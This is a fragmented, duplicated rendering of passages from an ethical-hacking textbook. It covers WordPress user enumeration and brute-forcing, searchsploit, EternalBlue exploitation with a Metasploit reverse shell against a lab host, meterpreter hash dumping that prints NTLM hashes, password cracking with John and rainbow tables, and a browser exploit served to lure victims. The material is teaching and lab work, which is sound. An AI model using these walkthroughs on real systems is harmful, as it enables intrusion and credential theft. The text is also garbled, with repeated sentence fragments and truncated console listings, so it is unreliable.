"com > basic options : name current setting required description -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- - format a , aa , aaa yes the expected directory","com > basic options : name current setting required description -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- - format a , aa , aaa yes the expected directory format ( a alpha , d digit , a upperalpha ) path / yes the path to identify directories proxies no a proxy chain of format type : host : port [ , type : host : port ] ["
52 yes the target address range or cidr identifier rport 80 yes the target port ( tcp ) ssl false no negotiate ssl/tls for outgoing connections threads 1 yes the,52 yes the target address range or cidr identifier rport 80 yes the target port ( tcp ) ssl false no negotiate ssl/tls for outgoing connections threads 1 yes the number of concurrent threads vhost no http server virtual host description : this module identifies the existence of interesting directories by brute forcing the name in a given directory path
"msf auxiliary ( scanner/url > set format a , aa , aaa , aaaa , aaaaa , aaaaaa , aaaaaaa , aaaaaaaa format = > a ,","msf auxiliary ( scanner/url > set format a , aa , aaa , aaaa , aaaaa , aaaaaa , aaaaaaa , aaaaaaaa format = > a , aa , aaa , aaaa , aaaaa , aaaaaa , aaaaaaa , aaaaaaaamsf auxiliary ( scanner/url > run [ * ] using code '404 ' as not found"
"metasploit , as always , has a large number of modules that can","metasploit , as always , has a large number of modules that can be used for web-based enumeration beyond just identifying directories on the web server"
"as you start working with websites and , more specifically , web applications , you will","as you start working with websites and , more specifically , web applications , you will run across a lot of open-source applications that are well known because they are so commonly used"
"the wordpress_login_enum module can take a user file or a password file , or you could","the wordpress_login_enum module can take a user file or a password file , or you could provide a single username with a password file or a single password with a username file"
enumerating usernames in wordpress msf auxiliary ( scanner/url > set blank_passwords,enumerating usernames in wordpress msf auxiliary ( scanner/url > set blank_passwords true blank_passwords = > truemsf auxiliary ( scanner/url > set rhosts 192
52:80 - / - wordpress user-enumeration - running user enumeration [ + ] / - found,52:80 - / - wordpress user-enumeration - running user enumeration [ + ] / - found user 'kilroy ' with id 1 [ + ] / - usernames stored in : /root/
52:80 - [ 1/0 ] - / - wordpress brute force,52:80 - [ 1/0 ] - / - wordpress brute force - running bruteforce [ * ] / - brute-forcing previously found accounts
[ * ] scanned 1 of 1 hosts ( 100 % complete ) [ * ] auxiliary module execution completed you ’ ll notice it makes,"[ * ] scanned 1 of 1 hosts ( 100 % complete ) [ * ] auxiliary module execution completed you ’ ll notice it makes reference to storing the username in a file in the home directory of the root user , which is the user under which msfconsole is running"
anytime you want to check to see what you have grabbed in terms,"anytime you want to check to see what you have grabbed in terms of information like credentials , you can run the command loot inside msfconsole"
listing loot in msfconsole msf auxiliary ( scanner/url > loot loot==== host service type name content info path,listing loot in msfconsole msf auxiliary ( scanner/url > loot loot==== host service type name content info path -- -- -- -- -- - -- -- -- -- -- -- -- - -- -- -- -- 192
"again , we can rely on kali linux because it ’ s freely available and easy","again , we can rely on kali linux because it ’ s freely available and easy to use , not to mention the fact that there are hundreds of tools that are available"
kali comes with the program wpscan that can be used,"kali comes with the program wpscan that can be used to enumerate not only users , but also themes and plug-ins"
"when it comes to a web application like wordpress , the plug-ins","when it comes to a web application like wordpress , the plug-ins can also be useful to know about because they may also introduce vulnerabilities"
"4 sponsored by sucuri - url @ _wpscan_ , @ ethicalhack3r , @ erwan_lr , @ _firefart________________________________________________________________ [ + ] url : url started : sun aug","4 sponsored by sucuri - url @ _wpscan_ , @ ethicalhack3r , @ erwan_lr , @ _firefart________________________________________________________________ [ + ] url : url started : sun aug 19 21:20:59 2018 [ + ] interesting header : link : < url > ; rel= '' url [ + ] interesting header : server : apache/2"
29 ( ubuntu ) [ + ] xml-rpc interface available under : url [ http 405 ] [ + ] found an rss feed : url [ http 200 ] [ ! ] detected 1 user from rss feed : + -- -- -- --,29 ( ubuntu ) [ + ] xml-rpc interface available under : url [ http 405 ] [ + ] found an rss feed : url [ http 200 ] [ ! ] detected 1 user from rss feed : + -- -- -- -- +| name |+ -- -- -- -- +| kilroy |+ -- -- -- -- + [ ! ] upload directory has directory listing enabled : url wp-content/uploads/ [ ! ] includes directory has directory listing enabled : url wp-includes/ [ + ] enumerating wordpress version
"8 ( released on 2018-08-02 ) identified from advanced fingerprinting , meta generator , links","8 ( released on 2018-08-02 ) identified from advanced fingerprinting , meta generator , links opml , stylesheets numbers [ + ] wordpress theme in use : twentyseventeen - v1"
| author : the wordpress team | author uri : url [,| author : the wordpress team | author uri : url [ + ] enumerating installed plugins ( only ones marked as popular )
000z | location : url | readme : url | changelog : url [,"000z | location : url | readme : url | changelog : url [ ! ] the version is out of date , the latest version is 3"
000z | location : url | readme : url | changelog : url [ !,000z | location : url | readme : url | changelog : url [ ! ] directory listing is enabled : url jetpack/ [ + ] name : tablepress - v1
000z | location : url | readme : url [ + ] finished : sun aug 19 21:21:06 2018 [,000z | location : url | readme : url [ + ] finished : sun aug 19 21:21:06 2018 [ + ] elapsed time : 00:00:06 [ + ] requests made : 1588 [ + ] memory used : 103
"09 mb in addition to user and plug-in enumeration , wpscan identified a couple","09 mb in addition to user and plug-in enumeration , wpscan identified a couple of issues with the wordpress installation , so those can be used down the road"
it also identified a header from the http communication that it felt to be interesting because,it also identified a header from the http communication that it felt to be interesting because it included the name of the product as well as the version and the operating system
looking for directories that are on the web server is also useful because,looking for directories that are on the web server is also useful because it can help us identify applica-tions as well as data that may be available
summary enumeration is the process of gathering a lot of information,summary enumeration is the process of gathering a lot of information further up the network stack than just ip addresses and ports
"we ’ re looking for things like usernames , where we can find them","we ’ re looking for things like usernames , where we can find them , and network shares and any other footholds we may be able to gather"
"in order to accomplish this enumeration work , there are","in order to accomplish this enumeration work , there are a number of protocols and tools that we can use"
"one feature of nmap that is very useful ,","one feature of nmap that is very useful , especially in these circumstances , is its scripting capability"
"when it comes to nmap , there are scripts that can be used not only","when it comes to nmap , there are scripts that can be used not only to probe services for additional details but to take advantage of the many enumeration capabilities"
this includes identifying shares that may be open as well as,this includes identifying shares that may be open as well as potentially users and other management-related information that can be accessed using smb
"we can use nmap to enumerate rpc services , since","we can use nmap to enumerate rpc services , since these services register dynamically with a mapping or registry service"
probing the rpc server will provide details about,probing the rpc server will provide details about the programs and ports that are exporting rpc functionality
metasploit comes with lots of modules that will enumerate shares and users,"metasploit comes with lots of modules that will enumerate shares and users on smb , services using sunrpc , and a number of other protocols"
while metasploit can be used across a lot of different protocols to look for,"while metasploit can be used across a lot of different protocols to look for different pieces of useful information , it is not the only tool you can use"
"you ’ re more likely to find those tools on windows systems , but","you ’ re more likely to find those tools on windows systems , but you can also find tools on linux systems , especially if you have samba installed"
"if you are okay with using linux , kali","if you are okay with using linux , kali linux is a distribution that includes hundreds of security-related tools"
"as you are performing this enumeration , you should be taking","as you are performing this enumeration , you should be taking notes so you have refer- ences when you are going forward"
"one advantage to using metasploit , not to oversell this software , is that","one advantage to using metasploit , not to oversell this software , is that it uses a database backend , which will store a lot of information automatically"
this is not to say that metasploit can be used to store every aspect of your,"this is not to say that metasploit can be used to store every aspect of your engagement , but you can refer to details later on by querying the metasploit database as needed"
what is the process java programs identify themselves to,what is the process java programs identify themselves to if they are sharing procedures over the network ? a
you are working with a colleague and you see,you are working with a colleague and you see them interacting with an email server using the vrfy command
which of these tools allows you to create your own,which of these tools allows you to create your own enumeration function based on ports being identified as open ? a
if you needed to enumerate data across multiple services and also store,"if you needed to enumerate data across multiple services and also store the data for retrieval later , what tool would you use ? a"
"certainly system hacking is an important element , since it ’ s where you","certainly system hacking is an important element , since it ’ s where you demonstrate that the vulnerabilities actually exist , but it ’ s not the only one"
"penetration testing , or ethical hacking , isn","penetration testing , or ethical hacking , isn ’ t just about breaking into systems—looting and pillaging"
breaking into a system demonstrates the existence of the vulnerabil-ity,"breaking into a system demonstrates the existence of the vulnerabil-ity , and it also provides potential pathways to other systems"
"with the end goal in mind , and with the list","with the end goal in mind , and with the list of vulnerabilities in place , we can start looking for exploits"
locating the exploits is essential to being able to,locating the exploits is essential to being able to run them against your target systems to gain access
"first , it demonstrates that there are passwords that can be cracked—strong pass-words shouldn","first , it demonstrates that there are passwords that can be cracked—strong pass-words shouldn ’ t be crackable without taking an immense amount of time and computing resources"
"when you run an exploit , you only have the permissions","when you run an exploit , you only have the permissions that have been provided to the user the service is running as"
"this means you need a local vulnerability , one that exists in software","this means you need a local vulnerability , one that exists in software that can only be accessed or run when you are logged into the system"
"running these privilege escalations , if they are suc - cessful , will","running these privilege escalations , if they are suc - cessful , will gain you another level of information and access that you can make use of"
"if you are really work- ing in a red-team capacity , where the operations teams at your target","if you are really work- ing in a red-team capacity , where the operations teams at your target are being tested for their ability to detect and respond , you too will want to cover your tracks"
"you need ways of exploiting the vulnerabilities , and even if you could","you need ways of exploiting the vulnerabilities , and even if you could , you just don ’ t have the time to write exploits yourself"
you need to demonstrate that a vulnerability is,you need to demonstrate that a vulnerability is exploitable for when you report to your customer/employer
another reason to run the exploit is to gain an additional layer,another reason to run the exploit is to gain an additional layer so you can pivot to other networks to look for more vulnerabilities
getting into a customer ’ s network to take down as many systems as you can just to,getting into a customer ’ s network to take down as many systems as you can just to have done it without any path for the customer to improve their security posture isn ’ t very ethical
keep in mind that your goal is always to improve security,keep in mind that your goal is always to improve security and not just to see how much damage you can cause
this is a site where researchers and developers post exploit code,this is a site where researchers and developers post exploit code and proof of concept code that works against identifi ed vulnerabilities
this may especially be true if the exploit is just a proof of concept,this may especially be true if the exploit is just a proof of concept that ’ s not fully implemented and may not take the exploit to the end
"in fairness , not all of these are exploits in the way you may think","in fairness , not all of these are exploits in the way you may think about exploits , if you are thinking of exploits as something that gives you a shell"
"at the top of the list , for example , you will see","at the top of the list , for example , you will see a link to a python script that enumerates usernames on an openssh 7"
"you ’ ll also see web application exploits , denial of","you ’ ll also see web application exploits , denial of service exploits , and local exploits , which include privilege escalation exploits"
"while the remote exploits may seem sexier—after all , who doesn ’ t love to pop","while the remote exploits may seem sexier—after all , who doesn ’ t love to pop a box ? —there is so much more to exploiting systems than just getting in remotely"
there may be an easier way to get to the,there may be an easier way to get to the exploits rather than opening a browser and going through the website
"kali linux has the repository of exploits available , as well as a","kali linux has the repository of exploits available , as well as a tool that can be used to search the repository from the command line"
"as an example , running arch strike over the top of manjaro linux , there is","as an example , running arch strike over the top of manjaro linux , there is a package for the exploitdb repository , so you don ’ t have to be running kali"
"instead , there is a shell script that will locate","instead , there is a shell script that will locate fi les included in the repository that match your search parameters"
"you can search for keywords , as shown , or you can specify","you can search for keywords , as shown , or you can specify where you are looking for the keyword , such as in the title"
finding exploits with searchsploit kilroy @ savagewood $ searchsploit openssh -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- exploit title |,finding exploits with searchsploit kilroy @ savagewood $ searchsploit openssh -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- exploit title | path | ( /usr/share/exploitdb-git/ ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- debian openssh - ( authenticated ) r | exploits/linux/remote/6094
sh -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- --,sh -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- shellcodes : no result the repository is broken into exploits and shellcodes
the shellcodes are what you place into overall exploit code,the shellcodes are what you place into overall exploit code that will provide you with shell access on the target system
"shellcode is commonly hexadecimal representations of assembly language operation codes ( opcodes ) , though here you may","shellcode is commonly hexadecimal representations of assembly language operation codes ( opcodes ) , though here you may also find files that just contain the assembly language code , which would need to be converted to opcodes"
running searchsploit against the filename reveals that it targets,running searchsploit against the filename reveals that it targets the windows 7 operating system but nothing beyond that
"interestingly , as a side note , compiling it and running it on a","interestingly , as a side note , compiling it and running it on a linux system generates the error that stack smashing was detected and the program crashes"
"it ’ s also probably the best legitimate site available , and","it ’ s also probably the best legitimate site available , and the fact that it comes with a search tool makes it very handy"
how far you can get with the code depends entirely,"how far you can get with the code depends entirely on the researcher , the vulnerability , and the software"
"sometimes , what you ’ ll get is just a demonstration that the vulnerability can be triggered","sometimes , what you ’ ll get is just a demonstration that the vulnerability can be triggered , but you may not get any further access to the remote system than you had before"
if you have a tor browser or just the software that creates a proxy server you can use to,"if you have a tor browser or just the software that creates a proxy server you can use to connect any browser to , you can start searching for sites where you can obtain some of this code"
there are a number of search engines that you can use that are,"there are a number of search engines that you can use that are more likely to find some of these darker sites , such as not evil"
"even if not evil turns up links in a search ,","even if not evil turns up links in a search , you aren ’ t guaranteed to find the site up and functional"
"perhaps more important , though , unless you are really good at reading source code , even if the source code is obfuscated ,","perhaps more important , though , unless you are really good at reading source code , even if the source code is obfuscated , you may find that you are working with infected software that could compromise you and your target in ways you didn ’ t expect"
"you may find some exploits on the tor network , but more than likely if you do","you may find some exploits on the tor network , but more than likely if you do , they will be for sale rather than just offered up for the good of the community"
"after all , when we do vulnerability scanning , we get an indication that a system may have a vulnerability , but until the vulnerability has been","after all , when we do vulnerability scanning , we get an indication that a system may have a vulnerability , but until the vulnerability has been exploited , it ’ s not guaranteed that the vulnerability exists , which means we aren ’ t sure whether it really needs to be fixed or not"
the second reason is that exploiting a vulnerability and compromising a system,"the second reason is that exploiting a vulnerability and compromising a system can lead us further into the organization , potentially exposing additional vulnerabilities"
"this is , in part , because we may get further reachability deeper into the network","this is , in part , because we may get further reachability deeper into the network but also because we may be able to harvest credentials that may be used on other systems"
"while metasploit does have a commercial offering , and if you are using it for business purposes","while metasploit does have a commercial offering , and if you are using it for business purposes , you should be paying for the commercial license ; there is a community edition as well"
"other software packages will do roughly the same thing as metasploit , and you should","other software packages will do roughly the same thing as metasploit , and you should take a look at them to see what you may prefer in a business setting"
"once you have a list of your vulnerabilities , you can","once you have a list of your vulnerabilities , you can search the exploit database for actual exploits that can be used"
metasploit modules if there is a known exploit for a,"metasploit modules if there is a known exploit for a vulnerability available , it has likely found its way into metasploit"
the idea was to provide building blocks so exploits could quickly be,the idea was to provide building blocks so exploits could quickly be developed by putting together a set of programming modules that could be used
while it may have started off as an exploit framework targeting security researchers who identify vulnerabilities so,"while it may have started off as an exploit framework targeting security researchers who identify vulnerabilities so they can easily create exploits , it has become a go-to tool for penetration and security testers"
one of the reasons is the large number of modules,one of the reasons is the large number of modules available that can be used while testing systems and networks
"as of the moment of this writing , there are over 1,000 auxiliary modules","as of the moment of this writing , there are over 1,000 auxiliary modules , many of which are scanners that can be used for reconnaissance and enumeration"
"you can also import vulnerability scans from openvas , nessus , and , of course","you can also import vulnerability scans from openvas , nessus , and , of course , nexpose , which is developed by the same company that is responsible for metasploit"
metasploit makes the work of exploiting considerably easier than going through the process,"metasploit makes the work of exploiting considerably easier than going through the process of creating an exploit by hand , assuming metasploit has an exploit available"
"we ’ re going to use the command line for this , though there are","we ’ re going to use the command line for this , though there are other options , like a web interface if you get the package from rapid 7"
"there are multiple ways of acquiring metasploit , but for this , i ’","there are multiple ways of acquiring metasploit , but for this , i ’ m just using an instance of kali linux , which has metasploit installed by default"
all i needed to do was set up the database that is,"all i needed to do was set up the database that is used to store information about hosts , vulnerabilities , and any loot acquired"
"in the following listing , you can see starting up msfconsole","in the following listing , you can see starting up msfconsole , which is the command-line program used to interact with metasploit"
o ' db ' bbp db'db'db ' dbbp dbp dbp bb db'db'db ' dbp,o ' db ' bbp db'db'db ' dbbp dbp dbp bb db'db'db ' dbp dbp dbp bb db'db'db ' dbbbbp dbp dbbbbbbb dbbbbbp dbbbbbb dbp dbbbbp dbp dbbbbbbp
there is a windows server on my home network that i,there is a windows server on my home network that i ’ m going to use for the purpose of demonstrating exploitation
"this is a metasploitable 3 instance , so there are sev-eral vulnerable services that","this is a metasploitable 3 instance , so there are sev-eral vulnerable services that have been built into it , making it perfect to demonstrate with and practice on"
you ’ ll see in the following listing a search for a module that,"you ’ ll see in the following listing a search for a module that will run the eternalblue exploit , which takes advantage of the vulnerability described in cve-2017-0144"
"we could narrow the scope with some additional parameters ,","we could narrow the scope with some additional parameters , like specifying the type using type : exploit , for example"
this may be useful if you have a very long list of,this may be useful if you have a very long list of results and you need to make it easier to identify the right one
"in this case , i want to get a shell on the remote system ; the auxiliary module will allow us","in this case , i want to get a shell on the remote system ; the auxiliary module will allow us to execute a single command on the remote system , which would be the same as the one ending in psexec"
"as a result , we ’ re going to use the exploit","as a result , we ’ re going to use the exploit ending in 010_eternal-blue , as you can see in the next code listing"
"from that shell , we can start issuing commands , but","from that shell , we can start issuing commands , but more than just one , which the others would let us do"
"this will either be rhost or rhosts , depending","this will either be rhost or rhosts , depending on whether the module expects to have multiple targets"
"a scan-ner module , for example , will use rhosts ,","a scan-ner module , for example , will use rhosts , while an exploit module will generally have rhost as the parameter name"
"in the following code listing , we need to set rhost","in the following code listing , we need to set rhost with the ip address of the target of our exploit attempt"
24msf exploit ( windows/smb/ms17_010_eternalblue ) > exploit [,24msf exploit ( windows/smb/ms17_010_eternalblue ) > exploit [ * ] started reverse tcp handler on 192
24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= not every vulnerability,24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= not every vulnerability is as successful as this one
"when you search for a module , you will get a ranking","when you search for a module , you will get a ranking that indicates to you how successful the exploit is likely to be"
"in some cases , there may be dependencies that need","in some cases , there may be dependencies that need to be in place before the vulnerability can be exploited"
"if it were easy and straightforward , after all , everyone would be able to do it , which","if it were easy and straightforward , after all , everyone would be able to do it , which might mean more security testing was getting done , which in turn may lead to fewer bugs in software"
"for example , we were working with the eternalblue","for example , we were working with the eternalblue exploit , which we know has a module in metasploit"
"2 exploit-db search results if you have the exploit-db package installed on your system , meaning you","2 exploit-db search results if you have the exploit-db package installed on your system , meaning you have search - sploit to use , you could just run searchsploit to do the same search"
"the exploit-db reposi - tory includes exploits and shellcodes , so the results","the exploit-db reposi - tory includes exploits and shellcodes , so the results don ’ t include papers like the ones you get from the website"
"additionally , you are not required to download or look at the code","additionally , you are not required to download or look at the code in a web browser because you have the code down - loaded already"
this isn ’ t especially surprising because,this isn ’ t especially surprising because there is no shellcode especially associated with eternalblue
"instead , it ’ s just a vulner - ability in","instead , it ’ s just a vulner - ability in the implementation of the server message block ( smb ) protocol"
searchsploit results for eternalblue root @ quiche : ~ # searchsploit `` eternal blue '' -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- exploit,searchsploit results for eternalblue root @ quiche : ~ # searchsploit `` eternal blue '' -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- exploit title | path | ( /usr/share/exploitdb/ ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- microsoft windows windows 7/2008 r2 ( x | exploits/windows_x86-64/remote/42031
"it will also allow you to make changes , if you wanted","it will also allow you to make changes , if you wanted to experiment , while leaving the functional exploit code intact where it is"
an exploit is the means for an external entity to cause a program to fail in,an exploit is the means for an external entity to cause a program to fail in a way that allows the attacker to control the flow of the program ’ s execution
24 payload shellcode size : 1262 numgroomconn : 13 target os : windows server 2008 r2 standard 7601 service pack 1 smb1 session setup,24 payload shellcode size : 1262 numgroomconn : 13 target os : windows server 2008 r2 standard 7601 service pack 1 smb1 session setup allocate nonpaged pool success smb1 session setup allocate nonpaged pool success good response status : invalid_parameter done this is only half of the attack
"what you see here is the exploit running successfully , triggering the","what you see here is the exploit running successfully , triggering the vulnerability and getting the remote service to execute the shellcode pro- vided"
it includes a meterpreter shell and a way to connect back,it includes a meterpreter shell and a way to connect back to the system it has been confi gured to call back to
"in the following listing , you can see loading the","in the following listing , you can see loading the listener module , setting the listening port and ip address"
it has a number of commands that can be run against,it has a number of commands that can be run against the target system regardless of what operating system the target system has
meterpreter translates the commands passed to it into,meterpreter translates the commands passed to it into ones that are specific to the underly-ing operating system
"this can include listing files , changing directories ,","this can include listing files , changing directories , uploading files , and gathering system information like passwords"
"gathering passwords once you have an exploited system ,","gathering passwords once you have an exploited system , you will want to start gathering information on it"
"not all exploits in metasploit can yield a meterpreter shell , but if we can","not all exploits in metasploit can yield a meterpreter shell , but if we can get one , we have a powerful ally in gathering information and performing post-exploitation work"
"using meterpreter , we can gather information about the system","using meterpreter , we can gather information about the system so we know what we ’ re getting for password data"
obtaining passwords with meterpreter computer : wubble-c765f2 os :,"obtaining passwords with meterpreter computer : wubble-c765f2 os : windows xp ( build 2600 , service pack 2 )"
"the credentials may be useful for additional vulnerabilities ,","the credentials may be useful for additional vulnerabilities , or at least with different testing programs and metasploit modules"
"you can see the results of running msv , which makes","you can see the results of running msv , which makes use of the msv authentication package to pull the hashes for users"
meterpreter > msv [ + ] running as system [ * ] retrieving msv credentialsmsv credentials=============== authid package domain user password -- -- -- -- -- -- - -- -- -- -- -- -- -- -- --,"meterpreter > msv [ + ] running as system [ * ] retrieving msv credentialsmsv credentials=============== authid package domain user password -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- 0 ; 293526 ntlm vagrant-2008r2 vagrant lm { 5229b7f52540641daad3b435b51404ee } , ntlm { e02bc503339d51f71d913c245d35b50b } 0 ; 96746 ntlm vagrant-2008r2 sshd_server lm { e501ddc244ad2c14829b15382fe04c64 } , ntlm { 8d0a16cfc061c3359db455d00ec27035 } 0 ; 996 negotiate workgroup vagrant-2008r2 $ n"
"( livessp ko ) when we compromise a linux system , we","( livessp ko ) when we compromise a linux system , we can ’ t use hashdump but we still want to grab the passwords"
"either we can get a shell directly from an exploit , or","either we can get a shell directly from an exploit , or if we use a meterpreter payload , we can drop to a shell"
if you want to collect passwords from an exploit that doesn ’ t,"if you want to collect passwords from an exploit that doesn ’ t give you root access , you ’ ll need to find a privilege escalation"
while the means of getting to the pass-words shown,"while the means of getting to the pass-words shown here is different from windows , these are also hashes"
"passing the hash in would result in it being hashed , so","passing the hash in would result in it being hashed , so the resulting hash from that computation wouldn ’ t match what was stored"
the only way to match the stored hash is to use the password,"the only way to match the stored hash is to use the password , or at least use a value that will generate the same hash result"
"when it comes to cracking pass-words , we are trying","when it comes to cracking pass-words , we are trying to identify a value that will generate the cryptographic hash"
"since we only care about the hashes being equal , it","since we only care about the hashes being equal , it doesn ’ t matter if what goes in is actually the password"
a hash algorithm that yields 256 bits as output has orders of,a hash algorithm that yields 256 bits as output has orders of magnitude more potential hash values than one that only generates 128 bits
"the issue of collisions is sometimes referred to as the birthday paradox , which relates to the","the issue of collisions is sometimes referred to as the birthday paradox , which relates to the statistical probability of two people in a room having the same birthday ( month and day )"
in order for there to be a 50 percent probability that two people,"in order for there to be a 50 percent probability that two people have the same birthday , you only need 23 people in the room"
"john is a great offl ine pass- word cracking tool , which means","john is a great offl ine pass- word cracking tool , which means that it works on fi les that have been grabbed from their original source"
single crack mode takes information from the different fi elds in the,"single crack mode takes information from the different fi elds in the fi le , applying mangling rules to them , to try as passwords"
this is a straightforward mode that takes a wordlist as input,"this is a straightforward mode that takes a wordlist as input , comparing the hash of each word against the password hash"
"you can apply mangling rules to your wordlist , which will generate variants on","you can apply mangling rules to your wordlist , which will generate variants on the words , since people often use variations on known words as their passwords"
"because of the number of possible variants , this mode will need to be stopped because john can ’","because of the number of possible variants , this mode will need to be stopped because john can ’ t get through all the variants in a reason-able time , unless you have specified a short password length"
"in the early days of unix , from which linux is derived","in the early days of unix , from which linux is derived , there was a single file where user information and passwords were stored"
the problem with that was that there was information that regular users needed to obtain,"the problem with that was that there was information that regular users needed to obtain from that file , which meant permissions had to be such that anyone could read it"
"as a result , the public information was stored in one file , still named passwd for backward compatibility , while the passwords and","as a result , the public information was stored in one file , still named passwd for backward compatibility , while the passwords and the necessary information that went with them , like the usernames and user ids , were stored in another file , the shadow file"
"once you have the two files merged using unshadow ,","once you have the two files merged using unshadow , you can run john against it to acquire the password"
the $ 6 $ at the begin-ning of the password indicates that the password has,the $ 6 $ at the begin-ning of the password indicates that the password has been hashed using the secure hash algorithm with 512 bits for the output ( sha-512 )
"with today ’ s processors , the time and computing power necessary","with today ’ s processors , the time and computing power necessary aren ’ t such a big deal other than it adds up"
there are many tools that can be used to look up,"there are many tools that can be used to look up passwords from these tables , but first we need the tables"
the rainbow crack project has a tool to look up the,the rainbow crack project has a tool to look up the password as well as a tool that will create the rainbow table
using rtgen for rainbow tables root @ quiche : ~ # rtgen,using rtgen for rainbow tables root @ quiche : ~ # rtgen md5 loweralpha-numeric 5 8 0 3800 33554432 0 rainbow table md5_loweralpha-numeric # 5-8_0_3800x33554432_0
rt parametershash algorithm : md5hash length : 16charset name : loweralpha-numericcharset data : abcdefghijklmnopqrstuvwxyz0123456789charset data in hex : 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76,rt parametershash algorithm : md5hash length : 16charset name : loweralpha-numericcharset data : abcdefghijklmnopqrstuvwxyz0123456789charset data in hex : 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 30 31 32 33 34 35 36 37 38 39 charset length : 36plaintext length range : 5 - 8reduce offset : 0x00000000plaintext total : 2901711320064 sequential starting point begin from 0 ( 0x0000000000000000 ) generating
"if we were trying to generate four-character passwords , we would have 36 *","if we were trying to generate four-character passwords , we would have 36 * 36 * 36 * 36 possible passwords , which is 1,679,616—nearly 2 million four-character passwords"
the next two values on the command line are,the next two values on the command line are the minimum password length and the maximum password length
"obviously , the more password lengths we take on , the more pass","obviously , the more password lengths we take on , the more pass - words we have to generate and the larger our output will be"
"the more chains generated , the more data is","the more chains generated , the more data is stored on disk because it means more plaintext is stored"
to have enough in the way of rainbow tables to really crack passwords,"to have enough in the way of rainbow tables to really crack passwords , we would need at least gigabytes , if not terabytes or more"
txt 1 rainbow tables found no hash found result one thing to note here with respect to the,txt 1 rainbow tables found no hash found result one thing to note here with respect to the location of the rainbow tables is they are not actually stored in the directory from which rcrack is run
"instead , the rainbow tables are stored in /usr/share/rainbowcrack","instead , the rainbow tables are stored in /usr/share/rainbowcrack on the kali system from which this was run"
"when you run rtgen , the table is stored in","when you run rtgen , the table is stored in that directory because that ’ s where the binaries are located"
the current directory in this instance is the directory where,the current directory in this instance is the directory where rcrack is rather than the directory where the user is
"this can require client-side vulnerabilities , that is , vulnerabilities that exist on","this can require client-side vulnerabilities , that is , vulnerabilities that exist on the desktop that aren ’ t exposed to the outside world without client interaction"
"an attacker could trigger that vul-nerability , not by probing the outside","an attacker could trigger that vul-nerability , not by probing the outside of the desktop system but instead by sending email to a victim"
"the victim on the client system opens the email , the","the victim on the client system opens the email , the vulnerability is triggered , and the attacker gains access to the system"
not everyone uses email clients like outlook or thunderbird,"not everyone uses email clients like outlook or thunderbird anymore , though email clients once were very commonly used"
"browsers are used for so many other common functions , to the","browsers are used for so many other common functions , to the point that they can be the only application some people ever use"
"as chrome os began life as a thin web client , most","as chrome os began life as a thin web client , most applica-tions you will run on chrome os run inside a browser context"
another factor that makes the browser a nice target is that,another factor that makes the browser a nice target is that there just aren ’ t a lot of browsers in use
data from a couple of different sources shows that chrome is,"data from a couple of different sources shows that chrome is , by far , the predominant browser in use around the world"
"as a result , if you can find a vulnerability that","as a result , if you can find a vulnerability that affects chrome on windows , you ’ ll be in the money"
the problem with that is that google tends to be,the problem with that is that google tends to be extremely diligent when it comes to finding and fixing vulnerabilities
firefox exploit module in msfconsole msf > use exploit/osx/browser/mozilla_mchannel msf exploit ( osx/browser/mozilla_mchannel ) > show options module options ( exploit/osx/browser/mozilla_mchannel ) : name current,firefox exploit module in msfconsole msf > use exploit/osx/browser/mozilla_mchannel msf exploit ( osx/browser/mozilla_mchannel ) > show options module options ( exploit/osx/browser/mozilla_mchannel ) : name current setting required description -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- - srvhost 0
62:4444msf exploit ( osx/browser/mozilla_mchannel ) > [ * ],62:4444msf exploit ( osx/browser/mozilla_mchannel ) > [ * ] using url : url local ip : url server started
this means you need to indicate what ip address the,"this means you need to indicate what ip address the server should be listening on , as well as the port"
"when the server starts up , a url is randomly generated","when the server starts up , a url is randomly generated , though you can provide one in the options if you prefer"
"starting up the exploit also creates a listener ,","starting up the exploit also creates a listener , expected to handle the return connection from the target system"
the return connection comes from the payload that is delivered to the,"the return connection comes from the payload that is delivered to the target when they make the connection , if the vulnerability is exploited"
"there are several ways to do that , including send-ing email with the url obscured ,","there are several ways to do that , including send-ing email with the url obscured , since a url that includes elements like :8080 and then a random string may be suspicious"
"once you get your victim to visit the url ,","once you get your victim to visit the url , their browser makes a request that gets handled by metasploit"
"if the exploit is successful , it should fire a","if the exploit is successful , it should fire a connection back to the handler that the exploit started up"
"gaining access to the system is only a part of what an attacker would do ,","gaining access to the system is only a part of what an attacker would do , so it ’ s only a part of what you would be doing as an ethical hacker"
"gaining root or administrator permissions is a common objective for attackers , since","gaining root or administrator permissions is a common objective for attackers , since it helps them pivot to other systems to move laterally within the environment"
you may also have a better chance to collect passwords and,you may also have a better chance to collect passwords and other critical system information that you may need for other tasks
"you not only have a foothold on the system , but","you not only have a foothold on the system , but that system gives you a foothold on the network as well"
"you may find , especially if you have compromised a system offering services to","you may find , especially if you have compromised a system offering services to the outside world , that the system is connected to more than one network"
